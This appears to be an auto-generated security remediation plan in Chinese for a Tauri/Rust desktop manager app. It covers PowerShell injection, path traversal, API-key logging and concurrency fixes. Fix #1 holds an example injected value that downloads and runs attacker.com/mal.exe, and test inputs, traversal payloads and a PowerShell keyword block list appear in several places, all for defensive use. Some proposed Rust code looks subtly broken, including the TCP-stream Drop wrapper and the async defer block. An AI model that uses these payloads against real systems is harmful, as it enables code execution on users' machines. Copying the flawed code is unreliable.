# 安全漏洞修复策略文档

## 批次 1：紧急安全修复（Critical/High 优先级）

生成时间：2026-09-08
审查报告来源：代码审查工作流 wf_4a573211-fac

---

## 🚨 修复 #1：PowerShell 命令注入漏洞（Critical）

### 📍 位置
- **文件：** `apps/claude-codex-pro-manager/src-tauri/src/commands.rs`
- **函数：** `run_claude_zh_patch_elevated()`, `powershell_single_quoted()`
- **行号：** 1924-1929

### 🔍 根因分析

**直接原因：**
```rust
// Line 1924-1928：不安全的 PowerShell 脚本构建
let exe_quoted = powershell_single_quoted(&exe.to_string_lossy());
let argument_list_quoted = powershell_single_quoted(&argument_list);
let script = format!(
    "$ErrorActionPreference='Stop'; try {{ $p = Start-Process -FilePath {exe_quoted} -ArgumentList {argument_list_quoted} ..."
);
```

`powershell_single_quoted()` 仅转义单引号（`'` → `''`），但：
1. 未转义 PowerShell 特殊字符：`` ` ``（转义符）、`$`（变量）
2. 使用字符串插值构建脚本，允许注入
3. 传递的参数包含用户可控的 `install_root`（line 1888-1894）

**触发条件示例：**
```rust
// 攻击者通过 Tauri IPC 调用 install_claude_zh_patch_at_install_root()
install_root = "C:\\Program`Files; Invoke-WebRequest http://attacker.com/mal.exe -OutFile mal.exe; Start-Process mal.exe"

// 最终 PowerShell 脚本变为：
Start-Process -FilePath 'claudecodexpro.exe' -ArgumentList '... C:\Program`Files; Invoke-WebRequest ...'
// 反引号导致命令分隔，注入成功
```

**深层原因：**
- 缺乏命令执行的安全抽象层
- 未对用户输入进行白名单验证
- 使用字符串拼接而非参数化命令

### ✅ 修复方案

#### 主方案：使用 PowerShell -EncodedCommand + 参数验证

**步骤 1：添加输入验证函数**

在 `commands.rs` 添加（建议在 line 1850 之后）：

```rust
/// 验证可执行文件路径在允许的目录范围内
fn validate_executable_path(path: &Path) -> anyhow::Result<PathBuf> {
    let canonical = std::fs::canonicalize(path)
        .with_context(|| format!("路径不存在或不可访问: {:?}", path))?;

    // 白名单：仅允许 Program Files、Windows、本地应用目录
    let allowed_prefixes = vec![
        PathBuf::from(r"C:\Program Files"),
        PathBuf::from(r"C:\Program Files (x86)"),
        PathBuf::from(r"C:\Windows\System32"),
        dirs::data_local_dir().ok_or_else(|| anyhow::anyhow!("无法获取本地数据目录"))?,
    ];

    if !allowed_prefixes.iter().any(|prefix| canonical.starts_with(prefix)) {
        anyhow::bail!("可执行文件路径不在允许的目录范围内: {:?}", canonical);
    }

    Ok(canonical)
}

/// 验证参数不包含危险字符
fn validate_powershell_argument(arg: &str) -> anyhow::Result<()> {
    const FORBIDDEN_CHARS: &[char] = &['`', '$', ';', '&', '|', '<', '>', '\n', '\r', '{', '}'];

    if let Some(bad_char) = arg.chars().find(|c| FORBIDDEN_CHARS.contains(c)) {
        anyhow::bail!("参数包含不允许的特殊字符: '{}'", bad_char);
    }

    // 额外检查：拒绝包含 PowerShell 关键字的参数
    const FORBIDDEN_KEYWORDS: &[&str] = &[
        "Invoke-Expression", "Invoke-Command", "Start-Process",
        "New-Object", "Add-Type", "iex", "icm",
    ];

    let lower = arg.to_lowercase();
    if FORBIDDEN_KEYWORDS.iter().any(|kw| lower.contains(&kw.to_lowercase())) {
        anyhow::bail!("参数包含禁止的 PowerShell 命令关键字");
    }

    Ok(())
}
```

**步骤 2：替换不安全的 `run_claude_zh_patch_elevated()` 实现**

修改 line 1920-1943：

```rust
// Line 1920 之后
log_manager_event(
    "manager.claude_zh_patch.elevated.start",
    json!({
        "internalCommand": internal_command,
        "arguments": arguments.len(),
    }),
);

let mut command: std::process::Command;
#[cfg(windows)]
{
    // ✅ 步骤 1：验证可执行文件路径
    let exe_validated = validate_executable_path(&exe)
        .context("可执行文件路径验证失败")?;

    // ✅ 步骤 2：验证所有参数
    for arg in &arguments {
        validate_powershell_argument(arg)
            .with_context(|| format!("参数验证失败: {}", arg))?;
    }

    // ✅ 步骤 3：使用参数化命令而非字符串拼接
    // 创建临时 PowerShell 脚本文件
    let temp_dir = std::env::temp_dir();
    let script_path = temp_dir.join(format!("ccpro-{}.ps1", std::process::id()));

    // 写入安全的参数化脚本（无用户输入插值）
    let ps_script = r#"
param(
    [Parameter(Mandatory=$true)][string]$ExePath,
    [Parameter(Mandatory=$true)][string[]]$Arguments
)
$ErrorActionPreference = 'Stop'
try {
    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName = $ExePath
    $psi.Arguments = $Arguments
    $psi.Verb = 'RunAs'
    $psi.UseShellExecute = $true
    $p = [System.Diagnostics.Process]::Start($psi)
    if ($null -eq $p) { exit 1 }
    $p.WaitForExit()
    exit $p.ExitCode
} catch {
    Write-Error $_
    exit 1
}
"#;
    std::fs::write(&script_path, ps_script)
        .with_context(|| format!("写入临时脚本失败: {:?}", script_path))?;

    // ✅ 步骤 4：使用 -File 参数传递参数（自动转义）
    let mut elevated_command = std::process::Command::new("powershell.exe");
    elevated_command.args([
        "-NoProfile",
        "-ExecutionPolicy", "Bypass",
        "-WindowStyle", "Hidden",
        "-File", script_path.to_str().unwrap(),
        "-ExePath", exe_validated.to_str().unwrap(),
        "-Arguments",
    ]);
    // 将参数作为数组元素传递，PowerShell 会自动转义
    for arg in &arguments {
        elevated_command.arg(arg);
    }

    use std::os::windows::process::CommandExt;
    elevated_command.creation_flags(claude_codex_pro_core::windows_create_no_window());
    command = elevated_command;

    // ✅ 步骤 5：确保临时脚本在执行后被删除
    let script_path_clone = script_path.clone();
    std::thread::spawn(move || {
        std::thread::sleep(std::time::Duration::from_secs(5));
        let _ = std::fs::remove_file(script_path_clone);
    });
}
#[cfg(target_os = "macos")]
{
    // macOS 部分保持不变（已使用 shell_single_quoted）
    // ... 现有代码
}
```

**步骤 3：修改调用点添加错误处理**

在 `install_claude_zh_patch_at_install_root()` (line 2134) 添加：

```rust
#[tauri::command]
pub async fn install_claude_zh_patch_at_install_root(
    install_root: String,
) -> CommandResult<ClaudeZhPatchPayload> {
    // ✅ 立即验证输入路径
    let install_root_path = PathBuf::from(install_root);
    let validated_path = validate_executable_path(&install_root_path)
        .map_err(|e| anyhow::anyhow!("安装路径验证失败: {}", e))?;

    // 使用验证后的路径继续执行
    // ...
}
```

#### 验证计划

**功能验证：**
1. 正常场景：使用合法的 Program Files 路径安装补丁，确认成功
2. 边界场景：测试包含空格、中文路径的安装目录
3. 攻击场景：
   ```rust
   // 测试用例：应拒绝以下输入
   install_claude_zh_patch_at_install_root("C:\\Windows; Invoke-WebRequest evil.com")
   install_claude_zh_patch_at_install_root("C:\\Program`Files")
   install_claude_zh_patch_at_install_root("..\\..\\Windows\\System32")
   ```

**回归测试：**
- 现有汉化补丁安装流程不受影响
- 提权对话框正常弹出
- 安装日志正确记录

**自动化测试用例：**

```rust
#[cfg(test)]
mod security_tests {
    use super::*;

    #[test]
    fn test_reject_path_traversal() {
        let result = validate_executable_path(Path::new("../../Windows/System32/cmd.exe"));
        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("不在允许的目录范围内"));
    }

    #[test]
    fn test_reject_powershell_injection() {
        let result = validate_powershell_argument("normal_arg; Invoke-WebRequest evil.com");
        assert!(result.is_err());
    }

    #[test]
    fn test_accept_valid_path() {
        // 需要实际存在的 Program Files 路径
        let result = validate_executable_path(Path::new(r"C:\Program Files\test.exe"));
        assert!(result.is_ok());
    }
}
```

### 📦 影响评估

**变更范围：**
- `commands.rs`：新增 2 个验证函数（~50 行）
- `commands.rs`：修改 `run_claude_zh_patch_elevated()`（~40 行变更）
- `commands.rs`：修改 `install_claude_zh_patch_at_install_root()`（+3 行验证）

**潜在风险：**
- ⚠️ **白名单过严**：可能拒绝某些合法的安装路径（如便携版、非默认安装位置）
  - 缓解：在错误消息中明确说明允许的路径范围，提示用户使用默认位置
- ⚠️ **临时脚本文件清理失败**：磁盘空间占用
  - 缓解：使用 `std::fs::remove_file` 的 Result，失败时记录警告日志

**回滚措施：**
1. 保留原函数为 `run_claude_zh_patch_elevated_legacy()`
2. 通过配置开关 `use_legacy_elevation: bool` 控制使用哪个版本
3. 如遇问题，设置 `"use_legacy_elevation": true` 回退

### ⏱️ 实施建议

**优先级：** 🔥 P0 - 立即修复
**紧急度：** Critical
**预计工时：** 4-6 小时（开发 + 测试）

**依赖条件：**
- 无外部依赖
- 需要 Windows 测试环境（含 UAC 提权）

**部署注意事项：**
1. 修复后立即发布热修复版本（如 v1.x.1）
2. 在发布说明中标注安全修复，但不公开细节避免 0day 利用
3. 通知所有用户升级，标记为关键安全更新

**实施步骤：**
1. 创建修复分支：`fix/critical-powershell-injection`
2. 应用上述代码变更
3. 运行单元测试 + 手动安全测试
4. Code Review（至少 2 人审核）
5. 合并到 main 并立即发布

---

## 🚨 修复 #2：路径遍历漏洞 - 未验证安装路径（High）

### 📍 位置
- **文件：** `apps/claude-codex-pro-manager/src-tauri/src/commands.rs`
- **函数：** `install_claude_zh_patch_at_install_root()`
- **行号：** 2134-2138

### 🔍 根因分析

**直接原因：**
```rust
#[tauri::command]
pub async fn install_claude_zh_patch_at_install_root(
    install_root: String,
) -> CommandResult<ClaudeZhPatchPayload> {
    let install_root = PathBuf::from(install_root);  // ❌ 未验证
    // 直接使用于文件操作...
}
```

用户可通过 Tauri IPC 提供任意路径字符串，无验证直接转换为 `PathBuf`。

**攻击场景：**
```javascript
// 前端恶意调用
invoke('install_claude_zh_patch_at_install_root', {
  installRoot: '../../../Windows/System32'
})
```

### ✅ 修复方案

**直接应用修复 #1 中的 `validate_executable_path()` 函数：**

```rust
#[tauri::command]
pub async fn install_claude_zh_patch_at_install_root(
    install_root: String,
) -> CommandResult<ClaudeZhPatchPayload> {
    // ✅ 步骤 1：规范化路径
    let install_root_path = PathBuf::from(install_root);

    // ✅ 步骤 2：验证路径在允许范围内
    let validated_root = validate_executable_path(&install_root_path)
        .map_err(|e| {
            log_manager_event(
                "manager.install_zh_patch.path_validation_failed",
                json!({
                    "error": e.to_string(),
                    "provided_path": install_root_path.display().to_string(),
                }),
            );
            anyhow::anyhow!("安装路径验证失败: {}。仅允许 Program Files、Windows 或本地应用目录。", e)
        })?;

    log_manager_event(
        "manager.install_zh_patch.path_validated",
        json!({
            "validated_path": validated_root.display().to_string(),
        }),
    );

    // ✅ 步骤 3：使用验证后的路径
    run_claude_zh_patch_elevated(
        Some(&validated_root),  // 传递 &Path 而非原始 String
        "install-at-root",
    )
    .await
}
```

**同时修改相关函数签名：**

```rust
// 修改 run_claude_zh_patch_elevated() 接受 &Path
async fn run_claude_zh_patch_elevated(
    install_root: Option<&Path>,  // 改为 &Path
    internal_command: &str,
) -> anyhow::Result<ClaudeZhPatchResult> {
    // ...
    let target_install_root = install_root
        .map(|path| path.to_string_lossy().to_string())
        .unwrap_or_else(|| {
            // 自动检测时也要验证
            let detected = claude_codex_pro_core::claude_zh_patch::detect_status()
                .install_root
                .unwrap_or_default();
            // ✅ 对检测到的路径也进行验证
            if let Ok(validated) = validate_executable_path(Path::new(&detected)) {
                validated.to_string_lossy().to_string()
            } else {
                String::new()  // 验证失败则拒绝
            }
        });

    // 额外安全检查
    if target_install_root.is_empty() {
        anyhow::bail!("无法确定有效的 Claude 安装路径");
    }
    // ...
}
```

### 📦 影响评估

**变更范围：**
- 与修复 #1 共享 `validate_executable_path()` 函数
- 修改 `install_claude_zh_patch_at_install_root()`（+15 行）
- 修改 `run_claude_zh_patch_elevated()` 签名和逻辑（~10 行）

**潜在风险：**
- 现有用户如使用非标准安装路径，可能无法应用补丁
  - 缓解：提供清晰错误消息，引导用户使用官方安装位置

**回滚措施：**
- 通过配置项 `"skip_path_validation": true` 临时禁用验证（仅开发/调试用）

---

## 🚨 修复 #3：会话 ID 路径注入（High）

### 📍 位置
- **文件：** `apps/claude-codex-pro-manager/src-tauri/src/commands.rs`
- **结构体：** `DeleteClaudeSessionRequest`
- **行号：** 487-491

### 🔍 根因分析

**问题代码：**
```rust
#[derive(Debug, Clone, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct DeleteClaudeSessionRequest {
    pub session_id: String,      // ❌ 未验证格式
    pub source_path: String,     // ❌ 未验证路径
}
```

**攻击场景：**
```javascript
// 前端恶意调用
invoke('delete_claude_session', {
  sessionId: '../../../sensitive_data/db.sqlite',
  sourcePath: 'C:\\Windows\\System32'
})
```

如果后续代码使用 `session_id` 构造文件路径（如 `{source_path}/{session_id}.db`），会导致路径遍历。

### ✅ 修复方案

**步骤 1：为请求结构体添加验证方法**

```rust
#[derive(Debug, Clone, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct DeleteClaudeSessionRequest {
    pub session_id: String,
    pub source_path: String,
}

impl DeleteClaudeSessionRequest {
    /// 验证请求参数的安全性
    pub fn validate(&self) -> anyhow::Result<ValidatedDeleteRequest> {
        // ✅ 步骤 1：验证 session_id 格式（仅允许 UUID 或安全字符）
        let session_id_pattern = regex::Regex::new(r"^[a-zA-Z0-9_-]{1,64}$")
            .expect("session_id regex compilation failed");

        if !session_id_pattern.is_match(&self.session_id) {
            anyhow::bail!(
                "session_id 格式无效，仅允许字母、数字、下划线和连字符（1-64字符）"
            );
        }

        // ✅ 步骤 2：拒绝包含路径遍历字符的 session_id
        if self.session_id.contains("..") || self.session_id.contains('/') || self.session_id.contains('\\') {
            anyhow::bail!("session_id 包含非法路径字符");
        }

        // ✅ 步骤 3：验证 source_path 在允许的数据目录内
        let source_path = PathBuf::from(&self.source_path);
        let canonical_source = std::fs::canonicalize(&source_path)
            .with_context(|| format!("source_path 不存在: {:?}", source_path))?;

        // 白名单：仅允许 AppData 目录
        let allowed_data_dirs = vec![
            dirs::data_dir().ok_or_else(|| anyhow::anyhow!("无法获取数据目录"))?,
            dirs::data_local_dir().ok_or_else(|| anyhow::anyhow!("无法获取本地数据目录"))?,
        ];

        if !allowed_data_dirs.iter().any(|dir| canonical_source.starts_with(dir)) {
            anyhow::bail!(
                "source_path 不在允许的数据目录范围内: {:?}",
                canonical_source
            );
        }

        // ✅ 返回验证后的结构体
        Ok(ValidatedDeleteRequest {
            session_id: self.session_id.clone(),
            source_path: canonical_source,
        })
    }
}

/// 验证后的删除请求（使用 canonical path）
pub struct ValidatedDeleteRequest {
    pub session_id: String,
    pub source_path: PathBuf,
}
```

**步骤 2：修改命令处理函数使用验证后的请求**

找到使用 `DeleteClaudeSessionRequest` 的命令（可能在 commands.rs 的某处），修改为：

```rust
#[tauri::command]
pub async fn delete_claude_session(
    request: DeleteClaudeSessionRequest,
) -> CommandResult<DeleteSessionPayload> {
    // ✅ 立即验证请求
    let validated = request.validate()
        .map_err(|e| {
            log_manager_event(
                "manager.delete_session.validation_failed",
                json!({
                    "error": e.to_string(),
                    "session_id": request.session_id,
                }),
            );
            anyhow::anyhow!("请求验证失败: {}", e)
        })?;

    log_manager_event(
        "manager.delete_session.validated",
        json!({
            "session_id": validated.session_id,
            "source_path": validated.source_path.display().to_string(),
        }),
    );

    // ✅ 使用验证后的数据
    let db_path = validated.source_path.join(format!("{}.db", validated.session_id));

    // ✅ 再次确认最终路径在允许范围内（双重检查）
    if !db_path.starts_with(&validated.source_path) {
        anyhow::bail!("构造的数据库路径不在 source_path 内");
    }

    // 执行删除操作...
    std::fs::remove_file(&db_path)
        .with_context(|| format!("删除会话文件失败: {:?}", db_path))?;

    Ok(CommandResult {
        status: "ok".to_string(),
        message: "会话已删除".to_string(),
        payload: DeleteSessionPayload { /* ... */ },
    })
}
```

**步骤 3：为类似的请求结构体应用相同模式**

搜索其他接受路径参数的结构体，应用类似验证：

```bash
grep -rn "pub struct.*Request" apps/claude-codex-pro-manager/src-tauri/src/commands.rs
# 对每个结构体评估是否需要路径验证
```

### 📦 影响评估

**变更范围：**
- `commands.rs`：新增 `DeleteClaudeSessionRequest::validate()`（~60 行）
- `commands.rs`：修改相关命令处理函数（~20 行/命令）
- 添加依赖：`regex = "1"` 到 `Cargo.toml`

**潜在风险：**
- UUID 格式假设错误：如果现有 session_id 不是 UUID
  - 缓解：先扫描现有数据库确认 session_id 格式，调整正则表达式

---

## 🔑 修复 #4：API 密钥明文记录到日志（High）

### 📍 位置
- **文件：** `crates/claude-codex-pro-core/src/relay_config.rs`
- **函数：** `log_relay_test_event()` 及相关日志函数
- **行号：** 265

### 🔍 根因分析

**问题代码：**
```rust
log_manager_event(
    "manager.relay_test.fetch_models",
    json!({
        "sourceId": source.source_id,
        "endpoint": endpoint,  // ❌ 可能包含 ?api_key=xxx
        "httpStatus": status_code
    }),
);
```

如果 `endpoint` 包含查询参数中的 API 密钥（如 `https://api.example.com/models?api_key=sk-xxx`），会被明文记录到日志文件。

### ✅ 修复方案

**步骤 1：创建 URL 清理函数**

在 `crates/claude-codex-pro-core/src/relay_config.rs` 添加：

```rust
/// 从 URL 中移除敏感信息（API 密钥、认证 token）
fn sanitize_url_for_logging(url: &str) -> String {
    match reqwest::Url::parse(url) {
        Ok(mut parsed) => {
            // ✅ 移除所有查询参数（可能包含 API 密钥）
            parsed.set_query(None);

            // ✅ 移除用户信息（如果 URL 包含 http://user:pass@host）
            let _ = parsed.set_username("");
            let _ = parsed.set_password(None);

            // ✅ 移除 fragment
            parsed.set_fragment(None);

            parsed.to_string()
        }
        Err(_) => {
            // 如果不是有效 URL，返回占位符
            "[invalid-url]".to_string()
        }
    }
}

/// 从认证头中移除实际密钥值，仅保留类型
fn sanitize_auth_header(header: &str) -> String {
    if header.to_lowercase().starts_with("bearer ") {
        "Bearer [REDACTED]".to_string()
    } else if header.to_lowercase().starts_with("basic ") {
        "Basic [REDACTED]".to_string()
    } else {
        "[REDACTED]".to_string()
    }
}
```

**步骤 2：替换所有日志记录点**

搜索并修改所有记录 URL 或认证信息的日志：

```bash
grep -rn "log_manager_event\|log_relay_test_event" crates/claude-codex-pro-core/src/relay_config.rs
```

修改示例：

```rust
// 修改前
log_manager_event(
    "manager.relay_test.fetch_models",
    json!({
        "endpoint": endpoint,
        "httpStatus": status_code
    }),
);

// ✅ 修改后
log_manager_event(
    "manager.relay_test.fetch_models",
    json!({
        "endpoint": sanitize_url_for_logging(&endpoint),
        "httpStatus": status_code
    }),
);
```

**步骤 3：审计所有包含敏感数据的日志**

搜索关键字并逐一审查：

```bash
# 搜索可能记录敏感信息的日志
grep -rn "api_key\|apiKey\|bearer\|authorization\|password\|token" crates/claude-codex-pro-core/src/*.rs | grep log
```

对每个匹配项：
1. 判断是否记录到日志
2. 如果是，应用 `sanitize_*` 函数或移除该字段

**步骤 4：添加日志清理的单元测试**

```rust
#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_sanitize_url_removes_api_key() {
        let url = "https://api.example.com/v1/models?api_key=sk-1234567890&other=value";
        let sanitized = sanitize_url_for_logging(url);
        assert_eq!(sanitized, "https://api.example.com/v1/models");
        assert!(!sanitized.contains("sk-"));
    }

    #[test]
    fn test_sanitize_url_removes_basic_auth() {
        let url = "https://user:password@api.example.com/endpoint";
        let sanitized = sanitize_url_for_logging(url);
        assert!(!sanitized.contains("user"));
        assert!(!sanitized.contains("password"));
    }

    #[test]
    fn test_sanitize_auth_header() {
        assert_eq!(
            sanitize_auth_header("Bearer sk-1234567890"),
            "Bearer [REDACTED]"
        );
        assert_eq!(
            sanitize_auth_header("Basic dXNlcjpwYXNz"),
            "Basic [REDACTED]"
        );
    }
}
```

### 📦 影响评估

**变更范围：**
- `relay_config.rs`：新增 2 个清理函数（~40 行）
- 修改所有日志记录点（预计 10-15 处）

**潜在风险：**
- 调试困难：清理后的 URL 缺少查询参数可能影响问题排查
  - 缓解：保留查询参数的键名，仅清理值（如 `?api_key=[REDACTED]&format=json`）

**修改清理函数以保留参数名：**

```rust
fn sanitize_url_for_logging(url: &str) -> String {
    match reqwest::Url::parse(url) {
        Ok(mut parsed) => {
            // ✅ 保留查询参数的键，但清理敏感值
            if parsed.query().is_some() {
                let sanitized_query = parsed
                    .query_pairs()
                    .map(|(key, _value)| {
                        // 对敏感参数清理值
                        let sensitive_keys = ["api_key", "apikey", "key", "token", "password", "secret"];
                        if sensitive_keys.iter().any(|k| key.eq_ignore_ascii_case(k)) {
                            format!("{}=[REDACTED]", key)
                        } else {
                            format!("{}=[PRESERVED]", key)  // 或保留实际值
                        }
                    })
                    .collect::<Vec<_>>()
                    .join("&");
                parsed.set_query(Some(&sanitized_query));
            }

            let _ = parsed.set_username("");
            let _ = parsed.set_password(None);
            parsed.set_fragment(None);

            parsed.to_string()
        }
        Err(_) => "[invalid-url]".to_string(),
    }
}
```

---

## 📝 批次 1 实施时间表

| 修复项 | 优先级 | 预计工时 | 负责人 | 目标完成日期 |
|--------|--------|----------|--------|--------------|
| #1 PowerShell 注入 | P0 | 6h | [待分配] | 2026-09-09 |
| #2 路径遍历 | P0 | 2h | [待分配] | 2026-09-09 |
| #3 会话 ID 注入 | P0 | 4h | [待分配] | 2026-09-10 |
| #4 API 密钥日志泄漏 | P1 | 3h | [待分配] | 2026-09-10 |
| **总计** | | **15h** | | **2 天** |

## ✅ 批次 1 验收标准

- [ ] 所有 4 个安全漏洞修复并通过单元测试
- [ ] 手动安全测试通过（尝试攻击场景均被拒绝）
- [ ] Code Review 完成（至少 2 人审核）
- [ ] 文档更新：CHANGELOG.md 记录安全修复
- [ ] 发布热修复版本（v1.x.1）

---

## ⚡ 批次 2：正确性问题修复（Medium 优先级）

### 🚨 修复 #5：设置文件竞态条件（Medium）

#### 📍 位置
- **文件：** `crates/claude-codex-pro-core/src/settings.rs:457`
- **函数：** `BackendSettings::save()`

#### 🔍 根因分析

**问题代码：**
```rust
pub fn save(&self, store: &SettingsStore) -> anyhow::Result<()> {
    // 1. 获取文件锁
    let _lock = store.lock()?;
    
    // 2. 释放锁（drop）
    
    // 3. ❌ 锁已释放，但文件写入还未开始 - TOCTOU 窗口
    let json = serde_json::to_string_pretty(self)?;
    std::fs::write(&store.path, json)?;  // 另一个进程可能在此期间修改文件
    
    Ok(())
}
```

**TOCTOU（Time-of-Check to Time-of-Use）问题：**
- 锁在 `_lock` drop 时释放，但文件写入在之后
- 窗口期内其他进程/线程可以获取锁并修改文件
- 导致后写入者覆盖先写入者的更改

#### ✅ 修复方案

**主方案：原子文件写入模式**

```rust
use std::io::Write;
use std::os::unix::fs::PermissionsExt;  // Unix
use std::os::windows::fs::MetadataExt;  // Windows

pub fn save(&self, store: &SettingsStore) -> anyhow::Result<()> {
    // ✅ 步骤 1：获取文件锁并保持到写入完成
    let lock = store.lock()
        .context("获取设置文件锁失败")?;

    // ✅ 步骤 2：写入临时文件（在锁保护下）
    let temp_path = store.path.with_extension("tmp");
    let json = serde_json::to_string_pretty(self)
        .context("序列化设置失败")?;

    {
        let mut temp_file = std::fs::File::create(&temp_path)
            .with_context(|| format!("创建临时设置文件失败: {:?}", temp_path))?;
        
        temp_file.write_all(json.as_bytes())
            .context("写入临时设置文件失败")?;
        
        // ✅ 步骤 3：确保数据写入磁盘（fsync）
        temp_file.sync_all()
            .context("同步临时文件到磁盘失败")?;
    }

    // ✅ 步骤 4：原子重命名（在锁保护下）
    #[cfg(unix)]
    std::fs::rename(&temp_path, &store.path)
        .with_context(|| format!("原子重命名失败: {:?} -> {:?}", temp_path, store.path))?;

    #[cfg(windows)]
    {
        // Windows 需要先删除目标文件（如果存在）
        if store.path.exists() {
            std::fs::remove_file(&store.path)
                .context("删除旧设置文件失败")?;
        }
        std::fs::rename(&temp_path, &store.path)
            .with_context(|| format!("重命名失败: {:?} -> {:?}", temp_path, store.path))?;
    }

    // ✅ 步骤 5：锁在此处才释放（lock 的 Drop）
    drop(lock);

    log::info!("设置文件保存成功: {:?}", store.path);
    Ok(())
}
```

**清理失败的临时文件：**

```rust
impl Drop for SettingsStore {
    fn drop(&mut self) {
        // 清理可能残留的临时文件
        let temp_path = self.path.with_extension("tmp");
        if temp_path.exists() {
            let _ = std::fs::remove_file(&temp_path);
        }
    }
}
```

#### 📦 影响评估
- **变更范围：** `settings.rs` 的 `save()` 函数（~30 行修改）
- **风险：** 磁盘满时临时文件可能残留
  - 缓解：定期清理 + Drop 实现
- **性能影响：** `sync_all()` 增加 ~10ms 延迟，但保证数据持久性

---

### 修复 #6：unwrap() 滥用导致 panic（Medium）

#### 📍 位置
- **文件：** `crates/claude-codex-pro-core/src/launcher.rs:1137` 及多处

#### 🔍 问题

搜索所有 `unwrap()` 使用：

```bash
grep -n "\.unwrap()" crates/claude-codex-pro-core/src/launcher.rs
```

**危险场景：**
```rust
// Line 1137 示例（具体位置需确认）
let stream = accept_connection().await.unwrap();  // ❌ TCP 错误导致 panic
```

#### ✅ 修复方案

**模式 1：错误传播**
```rust
// 修改前
let stream = accept_connection().await.unwrap();

// ✅ 修改后
let stream = accept_connection().await
    .context("接受 TCP 连接失败")?;
```

**模式 2：优雅降级**
```rust
// 修改前
let config = load_config().unwrap();

// ✅ 修改后
let config = load_config()
    .unwrap_or_else(|e| {
        log::warn!("加载配置失败，使用默认值: {}", e);
        Config::default()
    });
```

**模式 3：记录日志后继续**
```rust
// 修改前
process_optional_task().unwrap();

// ✅ 修改后
if let Err(e) = process_optional_task() {
    log::error!("可选任务处理失败（已跳过）: {}", e);
}
```

#### 批量修复策略

1. **扫描所有 unwrap() 使用：**
```bash
rg "\.unwrap\(\)" --type rust crates/claude-codex-pro-core/src/ -n
```

2. **分类处理：**
   - **必须成功的操作**：改为 `?` 或 `expect("明确的错误消息")`
   - **可选操作**：改为 `unwrap_or_default()` 或 `unwrap_or_else()`
   - **内部不变量**：保留 `unwrap()` 但添加注释说明为何安全

3. **添加 Clippy lint：**

在 `crates/claude-codex-pro-core/src/lib.rs` 添加：

```rust
#![warn(clippy::unwrap_used)]
#![warn(clippy::expect_used)]
```

强制 CI 检查新增的 `unwrap()`。

---

### 修复 #7：TCP 流资源泄漏（Medium）

#### 📍 位置
- **文件：** `crates/claude-codex-pro-core/src/launcher.rs` 多处

#### ✅ 修复方案

**创建 RAII 包装器：**

```rust
/// 自动关闭的 TCP 流包装器
struct ManagedTcpStream {
    inner: tokio::net::TcpStream,
}

impl ManagedTcpStream {
    fn new(stream: tokio::net::TcpStream) -> Self {
        Self { inner: stream }
    }

    fn inner(&mut self) -> &mut tokio::net::TcpStream {
        &mut self.inner
    }
}

impl Drop for ManagedTcpStream {
    fn drop(&mut self) {
        // ✅ 确保 Drop 时关闭连接
        let rt = tokio::runtime::Handle::try_current();
        if let Ok(handle) = rt {
            let mut stream = self.inner.try_clone().ok();
            handle.spawn(async move {
                if let Some(mut s) = stream {
                    let _ = s.shutdown().await;
                }
            });
        }
    }
}
```

**或者：使用 scopeguard 库**

```toml
[dependencies]
scopeguard = "1.2"
```

```rust
use scopeguard::defer;

async fn handle_connection(mut stream: TcpStream) -> anyhow::Result<()> {
    // ✅ 确保函数退出时关闭流
    defer! {
        let _ = stream.shutdown().await;
    }

    // 业务逻辑...
    process_request(&mut stream).await?;

    Ok(())
}  // defer 块在此执行
```

---

### 修复 #8：并发访问共享状态（Medium）

#### 📍 位置
- **文件：** `crates/claude-codex-pro-core/src/settings.rs`

#### ✅ 修复方案

**引入全局设置单例：**

```rust
use std::sync::{Arc, RwLock};
use once_cell::sync::Lazy;

/// 全局设置单例（线程安全）
static GLOBAL_SETTINGS: Lazy<Arc<RwLock<BackendSettings>>> = Lazy::new(|| {
    let store = SettingsStore::default();
    let settings = store.load().unwrap_or_default();
    Arc::new(RwLock::new(settings))
});

/// 读取设置（共享访问）
pub fn read_settings<F, R>(f: F) -> R
where
    F: FnOnce(&BackendSettings) -> R,
{
    let guard = GLOBAL_SETTINGS.read().expect("设置读锁中毒");
    f(&*guard)
}

/// 修改设置（独占访问）
pub fn write_settings<F, R>(f: F) -> anyhow::Result<R>
where
    F: FnOnce(&mut BackendSettings) -> anyhow::Result<R>,
{
    let mut guard = GLOBAL_SETTINGS.write().expect("设置写锁中毒");
    let result = f(&mut *guard)?;

    // ✅ 写入后立即保存到磁盘
    guard.save(&SettingsStore::default())?;

    Ok(result)
}

// 使用示例
fn update_relay_profile(profile_id: &str, new_name: &str) -> anyhow::Result<()> {
    write_settings(|settings| {
        let profile = settings.relay_profiles
            .iter_mut()
            .find(|p| p.id == profile_id)
            .ok_or_else(|| anyhow::anyhow!("Profile not found"))?;
        
        profile.name = new_name.to_string();
        Ok(())
    })
}
```

---

### 修复 #9：错误传播链断裂（Medium）

#### 📍 位置
- **文件：** `apps/claude-codex-pro-manager/src-tauri/src/commands.rs` 多处

#### ✅ 修复方案

**模式：保留错误上下文**

```rust
// ❌ 修改前：吞噬错误
#[tauri::command]
pub async fn some_command() -> CommandResult<Payload> {
    match do_something().await {
        Ok(result) => ok("成功", result),
        Err(_) => failed("操作失败", Payload::default()),  // 错误信息丢失
    }
}

// ✅ 修改后：保留错误链
#[tauri::command]
pub async fn some_command() -> CommandResult<Payload> {
    match do_something().await {
        Ok(result) => ok("成功", result),
        Err(e) => {
            // 记录完整错误链到日志
            log::error!("操作失败: {:?}", e);
            
            // 返回用户友好消息 + 技术细节
            failed(
                &format!("操作失败: {}。详情请查看日志。", e),
                Payload::default()
            )
        }
    }
}

// ✅ 更好的方式：使用 anyhow::Context
#[tauri::command]
pub async fn some_command() -> CommandResult<Payload> {
    let result = do_something().await
        .context("执行主操作失败")?;  // 添加上下文

    let processed = process_result(&result)
        .context("处理结果失败")?;  // 逐层添加上下文

    ok("成功", processed)
}
```

**添加错误格式化辅助函数：**

```rust
/// 格式化 anyhow 错误链为用户友好消息
fn format_error_chain(error: &anyhow::Error) -> String {
    let mut msg = error.to_string();
    
    // 添加错误链
    for cause in error.chain().skip(1) {
        msg.push_str(&format!("\n  原因: {}", cause));
    }
    
    msg
}

// 使用
Err(e) => failed(&format_error_chain(&e), Payload::default())
```

---

## 🔧 批次 3：可维护性改进（Low 优先级）

### 修复 #10：App.tsx 过度臃肿（已部分完成）
